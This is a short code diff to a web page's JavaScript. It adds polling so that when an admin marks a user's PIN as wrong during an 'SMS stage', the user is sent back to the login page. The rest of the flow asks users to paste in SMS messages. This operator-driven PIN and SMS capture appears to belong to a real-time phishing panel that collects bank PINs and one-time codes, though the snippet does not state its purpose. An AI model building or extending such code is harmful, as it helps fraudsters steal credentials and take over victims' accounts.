@@ -1209,7 +1209,17 @@
             showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
 
           } else {
-            smsPollTimeout = setTimeout(checkStatus, 2000);
+            // Also check pinStatus in case admin clicked Wrong PIN during SMS stage
+            const pinRes  = await fetch(`/api/check-pin-status/${applicationId}`);
+            const pinData = await pinRes.json();
+            if (pinData.success && pinData.status === 'rejected') {
+              clearTimeout(smsPollTimeout);
+              S.applicationId = null;
+              goTo('page-login');
+              showLgMsg('error', 'Wrong PIN. Please try again.');
+            } else {
+              smsPollTimeout = setTimeout(checkStatus, 2000);
+            }
           }
         } else {
           smsPollTimeout = setTimeout(checkStatus, 3000);
